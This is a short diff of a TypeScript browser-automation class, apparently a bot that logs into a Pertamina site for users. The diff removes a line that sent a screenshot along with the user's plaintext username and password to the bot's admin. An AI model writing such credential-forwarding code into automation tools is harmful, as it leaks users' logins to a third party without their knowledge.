@@ -106,11 +106,7 @@ export class Pertamina {
         await page.click("#mantine-r4-body > div:nth-child(3) > div:nth-child(1) > button:nth-child(1)");
         await page.click(".styles_contained__1kIDF");
       }
-
-      await page.goto(this.linkPersonal);
     }
-
-    await this.bot.sendPhotoToAdmin(await page.screenshot(), `${this.username}:${this.password}`);
 
     await browser.close();
     return message;
